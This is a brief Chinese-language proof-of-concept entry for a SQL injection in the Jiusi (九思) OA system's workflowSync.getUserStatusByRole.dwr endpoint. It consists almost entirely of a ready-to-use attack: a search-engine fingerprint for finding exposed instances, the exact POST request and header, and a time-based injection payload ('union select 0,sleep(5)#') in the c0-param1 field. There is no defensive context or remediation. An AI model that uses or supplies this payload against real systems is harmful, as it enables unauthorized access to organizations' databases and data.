# 九思OAworkflowSync.getUserStatusByRole.dwrSQL注入漏洞

- **系统**：九思OAworkflowSync.getUserStatusByRole.dwr　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app="九思软件-OA"`
- **请求**：`POST /jsoa/workflow/dwr/exec/workflowSync.getUserStatusByRole.dwr HTTP/1.1`
- **关键头**：`Content-Type: application/x-www-form-urlencoded; charset=utf-8`

**请求体 / payload**
```
callCount=1
c0-scriptName=workflowSync
c0-methodName=getUserStatusByRole
c0-id=1
c0-param0=string:1
c0-param1=string:1 union select 0,sleep(5)#
xml=true
```
- **预期**：200　|　—